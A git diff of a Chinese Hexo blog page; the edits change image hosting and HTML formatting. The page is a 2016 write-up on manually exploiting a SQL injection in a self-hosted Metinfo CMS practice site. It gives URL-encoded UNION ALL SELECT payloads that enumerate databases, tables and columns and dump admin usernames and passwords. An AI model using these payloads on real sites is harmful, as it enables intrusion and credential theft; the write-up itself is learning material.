@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <title>记一次曲折的注入 | BlBana&#39;s Blog 一只Web汪 ~</title>
@@ -13,24 +13,24 @@
 <meta property="og:site_name" content="BlBana&#39;s Blog 一只Web汪 ~">
 <meta property="og:description" content="这两天自己搭了一个Metinfo的站点练手，从网上找了个注入点，手工测试了一下明显的有注入点的存在，先扔到SQLMAP里跑跑看~~">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/1.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/2.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/3.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/4.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/5.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/7.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/8.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/9.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/10.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/11.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/12.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/13.jpg">
-<meta property="og:image" content="http://blog.blbana.cc/img/Metinfo/14.jpg">
-<meta property="og:updated_time" content="2018-09-14T18:37:43.999Z">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/1.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/2.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/3.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/4.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/5.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/7.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/8.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/9.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/10.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/11.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/12.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/13.jpg">
+<meta property="og:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/14.jpg">
+<meta property="og:updated_time" content="2018-10-24T11:57:44.974Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="记一次曲折的注入">
 <meta name="twitter:description" content="这两天自己搭了一个Metinfo的站点练手，从网上找了个注入点，手工测试了一下明显的有注入点的存在，先扔到SQLMAP里跑跑看~~">
-<meta name="twitter:image" content="http://blog.blbana.cc/img/Metinfo/1.jpg">
+<meta name="twitter:image" content="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/1.jpg">
   
     <link rel="alternative" href="/atom.xml" title="BlBana&#39;s Blog 一只Web汪 ~" type="application/atom+xml">
   
@@ -49,7 +49,7 @@
   
   <!-- 加载特效 -->
     <script src="/js/pace.js"></script>
-    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet">
   <script>
       var yiliaConfig = {
           rootUrl: '/',
@@ -63,7 +63,7 @@
           open_in_new: false
       }
   </script>
-</head>
+</head></html>
 <body>
   <div id="container">
     <div class="left-col">
@@ -232,7 +232,7 @@
         </header>                
     </div>
 </nav>
-      <div class="body-wrap"><article id="post-e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5" class="article article-type-post" itemscope="" itemprop="blogPost">
   
     <div class="article-meta">
       <a href="/2016/07/28/e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5/" class="article-date">
@@ -242,7 +242,7 @@
   
   <div class="article-inner">
     
-      <input type="hidden" class="isFancy" />
+      <input type="hidden" class="isFancy">
     
     
       <header class="article-header">
@@ -279,26 +279,26 @@
 <h3 id="曲折才刚刚开始"><a href="#曲折才刚刚开始" class="headerlink" title="曲折才刚刚开始"></a>曲折才刚刚开始</h3><p><a href="http://mp.weixin.qq.com/s?__biz=MzIxNTIzMzM1Ng==&amp;mid=2651101014&amp;idx=1&amp;sn=15e52b03d594c7e848aef5b9e710a19c&amp;scene=24&amp;srcid=0716THfw2YH0oxgZcJ9Uc84M#rd" target="_blank" rel="noopener">参考链接</a></p>
 <p><code>/about/show.php?lang=cn&amp;amp;id=22</code></p>
 <p>这两天自己搭了一个Metinfo的站点练手，从网上找了个注入点，手工测试了一下明显的有注入点的存在，先扔到SQLMAP里跑跑看~~</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/1.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/1.jpg" alt="image"></p>
 <p>成功跑出来了我服务器上的所有数据库 ~ 可以的 大兄弟</p>
 <p>接着来跑跑表和字段吧~~</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/2.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/2.jpg" alt="image"></p>
 <p>接着又跑出来了所有的表和met_admin_column表中的所有字段，看来马上就成功啦 哈哈</p>
 <blockquote>
 <p>其实我们在使用工具的时候根据工具中回显的情况基本就可判断出，SQLMAP使用的是什么payload以及注入的具体方式，比如在我这次查询的过程中，可以看到不论查询的是数据库还是表，都是一个一个进行查询的，就可以判断出来payload中使用了LIMIT这样的查询方式，限定了每次查询的个数。要是出现一个一个字符出来的情况，可以判断出，查询数据库的版本可能较低，因为通常现在的数据库都是有元数据表的，可以直接进行查询，一个字符一个字符出现，说明他利用ACSII码在进行比对比对成功以后回显字符。<br>但是继续用SQLMAP跑字段中数据的时候出现了错误，无法dump字段中的数据，曲折就此开始……</p>
 </blockquote>
 <hr>
 <h3 id="开启手工大法"><a href="#开启手工大法" class="headerlink" title="开启手工大法"></a>开启手工大法</h3><p>既然工具无法顺利的跑出数据，可以尝试使用手工进行注入</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/3.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/3.jpg" alt="image"></p>
 <p>这是一个正常的页面</p>
 <h4 id="爆字段数"><a href="#爆字段数" class="headerlink" title="爆字段数"></a>爆字段数</h4><p>首先来测试一下字段数有多少，通常我们使用order by语句进行查询，尝试多次order by n ，n值无论如何测试，页面回显都是正常的，说明这种测试方法行不通</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/4.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/4.jpg" alt="image"></p>
 <p>换着使用union语句去查询当前表的字段数，利用：</p>
 <p><code>UNION ALL SELECT null</code></p>
 <p><code>UNION ALL SELECT null,null</code></p>
 <p><code>UNION ALL SELECT null,null,null</code></p>
 <p>方式递归查询字段数，直到返回正常的页面为止，当我查询到27个字段时为正常，第28个报错时，可以判断出共有27个字段数。</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/5.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/5.jpg" alt="image"></p>
 <p>成功爆出了字段数，继续下一步</p>
 <h4 id="爆出数据库"><a href="#爆出数据库" class="headerlink" title="爆出数据库"></a>爆出数据库</h4><p>先使用联合查询尝试爆出显位</p>
 <p><code>UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27</code></p>
@@ -306,7 +306,7 @@
 <p>修改payload，将整个payload进行URL编码</p>
 <p><code>%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23</code></p>
 <p>此时页面回显正常，说明我们语句构造成功了</p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/7.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/7.jpg" alt="image"></p>
 <p>但是回显的页面说我们权限不够，先不管他继续尝试注入看是否能够成功。</p>
 <p>先构造出查询数据库的查询语句，如下所示：</p>
 <p><code>%28SELECT%20CONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x71716a6a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%207%2C1%29</code></p>
@@ -314,23 +314,23 @@
 <p>以上两种语句都可以查询元数据表中的各个数据库名字</p>
 <p>我们将查询语句依次尝试放入各个字段的位置里进行测试，发现除了21号位置以外，其他不管放在什么位置都会弹出窗口显示权限不足。</p>
 <p><strong>其他位置</strong></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/8.jpg" alt="image"></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/9.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/8.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/9.jpg" alt="image"></p>
 <p><strong>21号字段</strong></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/10.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/10.jpg" alt="image"></p>
 <p>此时我们可以看到，当我们把查询语句放在21号位置上的时候页面返回正常，并且成功的爆出了显位是14号位置，仿佛看见了希望呀，感动~~~</p>
 <p>直接把查询语句放在14号位置，21号位置不放时，又出现了错误。。。我。。尼 淡定 。。。想了想看来得有个语句把21号位置占住了，不然有了显位也没用，没办法爆出数据库。</p>
 <p><code>/about/show.php?lang=cn&amp;amp;id=-1411%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2CCONCAT_WS(0x203a20,USER(),DATABASE(),VERSION())%2C15%2C16%2C17%2C18%2C19%2C20%2C%28SELECT%20CONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x71716a6a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%207%2C1%29%2C22%2C23%2C24%2C25%2C26%2C27%23</code></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/11.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/11.jpg" alt="image"></p>
 <p>这次再次尝试了新的payload，看到结果感动的不要不要的，数据库爆出来了 让我哭一会 （<em>看起来很容易的样子，我弄的时候刚开始没想到这，各种挠头啊啊啊，还是突然想到这么搞得…</em>）</p>
 <p>爆出了数据库剩下的就简单了</p>
 <h4 id="爆出表"><a href="#爆出表" class="headerlink" title="爆出表"></a>爆出表</h4><p><code>/about/show.php?lang=cn&amp;amp;id=-1411%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C(SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x6d6574)%2C15%2C16%2C17%2C18%2C19%2C20%2C%28SELECT%20CONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x71716a6a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%207%2C1%29%2C22%2C23%2C24%2C25%2C26%2C27%23</code></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/12.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/12.jpg" alt="image"></p>
 <p>哈哈 ~ fighting</p>
 <h4 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h4><p><code>/about/show.php?lang=cn&amp;amp;id=-1411%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C(SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x6d65745f61646d696e5f7461626c65)%2C15%2C16%2C17%2C18%2C19%2C20%2C%28SELECT%20CONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x71716a6a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%207%2C1%29%2C22%2C23%2C24%2C25%2C26%2C27%23</code></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/13.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/13.jpg" alt="image"></p>
 <h4 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h4><p><code>/about/show.php?lang=cn&amp;amp;id=-1411%20UNION%20ALL%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C(SELECT+GROUP_CONCAT(admin_pass,admin_name+SEPARATOR+0x3c62723e)+FROM+met.met_admin_table)%2C15%2C16%2C17%2C18%2C19%2C20%2C%28SELECT%20CONCAT%280x7162717671%2CIFNULL%28CAST%28schema_name%20AS%20CHAR%29%2C0x20%29%2C0x71716a6a71%29%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%207%2C1%29%2C22%2C23%2C24%2C25%2C26%2C27%23</code></p>
-<p><img src="http://blog.blbana.cc/img/Metinfo/14.jpg" alt="image"></p>
+<p><img src="http://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Metinfo/14.jpg" alt="image"></p>
 <p>成功</p>
 <h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实这个注入并不难，从它的代码上看到，没有任何的过滤措施，注入点就是一个基于布尔型的盲注，只要能够构造出来正确的查询语句，查询起来并不困难。这个注入点的难点其实就在于，你必须在占住21号位置的前提下利用14号位置进行查询，再者就是构造的语句必须经过URL编码，否则会报错。</p>
 <p><code>$show = $db-&amp;gt;get_one(&quot;SELECT * FROM $met_column WHERE id=$id and module=1&quot;);</code></p>
@@ -351,7 +351,7 @@
         <p><span>本文标题:</span><a href="/2016/07/28/e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5/">记一次曲折的注入</a></p>
         <p><span>文章作者:</span><a href="/" title="访问 BlBana 的个人博客">BlBana</a></p>
         <p><span>发布时间:</span>2016年07月28日 - 10时31分</p>
-        <p><span>最后更新:</span>2018年09月15日 - 02时37分</p>
+        <p><span>最后更新:</span>2018年10月24日 - 19时57分</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2016/07/28/e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5/" title="记一次曲折的注入">http://blbana.cc/2016/07/28/e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5/</a>
             <span class="copy-path" data-clipboard-text="原文: http://blbana.cc/2016/07/28/e8-ae-b0-e4-b8-80-e6-ac-a1-e6-9b-b2-e6-8a-98-e7-9a-84-e6-b3-a8-e5-85-a5/　　作者: BlBana" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
@@ -359,7 +359,7 @@
             <script> var clipboard = new Clipboard('.copy-path'); </script>
         </p>
         <p>
-            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target="_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
         </p>
     </div>
 
@@ -391,7 +391,7 @@
     <strong class="toc-title">文章目录</strong>
     <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#曲折才刚刚开始"><span class="toc-number">1.</span> <span class="toc-text">曲折才刚刚开始</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#开启手工大法"><span class="toc-number">2.</span> <span class="toc-text">开启手工大法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#爆字段数"><span class="toc-number">2.1.</span> <span class="toc-text">爆字段数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆出数据库"><span class="toc-number">2.2.</span> <span class="toc-text">爆出数据库</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆出表"><span class="toc-number">2.3.</span> <span class="toc-text">爆出表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆字段"><span class="toc-number">2.4.</span> <span class="toc-text">爆字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#爆数据"><span class="toc-number">2.5.</span> <span class="toc-text">爆数据</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
 </div>
-<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+<input type="button" id="tocButton" value="隐藏目录" title="点击按钮隐藏或者显示文章目录">
 
 <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 <script>
@@ -510,8 +510,8 @@
         
             <div class="visit">
                 
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >海贼到访数: 
+                    <span id="busuanzi_container_site_pv" style="display:none">
+                        <span id="site-visit">海贼到访数: 
                             <span id="busuanzi_value_site_uv"></span>
                         </span>
                     </span>
@@ -520,7 +520,7 @@
                     <span>, </span>
                 
                 
-                    <span id="busuanzi_container_page_pv" style='display:none'>
+                    <span id="busuanzi_container_page_pv" style="display:none">
                         <span id="page-visit">本页阅读量: 
                             <span id="busuanzi_value_page_pv"></span>
                         </span>
